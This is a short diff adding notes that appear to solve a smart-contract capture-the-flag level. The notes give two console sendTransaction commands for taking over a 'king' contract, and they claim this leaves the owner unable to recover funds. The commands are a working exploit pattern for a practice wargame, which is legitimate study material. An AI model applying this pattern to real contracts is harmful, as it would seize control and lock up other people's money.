@@ -1,0 +1,10 @@
+easy hack just to hack the prizzevariable and seet it t zeero then the owner will
+never been able to get the money back , but at least he can get the ownership back 
+if he send an empty message back
+
+contract.king.sendTransaction({from: player, to: contract.address, value: 0})
+
+
+contract.sendTransaction({from: player, to: contract.address, value: 1000000000000000010})
+
+the owner ca't  get his money bacck  beccause the first check in the if is wrong
